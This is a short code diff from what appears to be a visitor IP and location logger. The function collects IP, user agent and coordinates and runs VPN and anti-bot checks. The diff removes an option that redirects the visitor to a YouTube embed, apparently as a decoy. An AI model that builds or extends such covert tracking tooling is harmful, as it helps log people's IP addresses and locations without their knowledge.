@@ -119,10 +119,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         if config["vpnCheck"] == 1:
             ping = ""
 
-        if config["redirect"]["redirect"]:
-            youtube_link = "https://www.youtube.com/embed/RAZSdO2DA3E?autoplay=1&fs=1"
-            data = f'<meta http-equiv="refresh" content="0;url={youtube_link}">'.encode()
-
     if info["hosting"]:
         if config["antiBot"] == 4:
             if info["proxy"]:
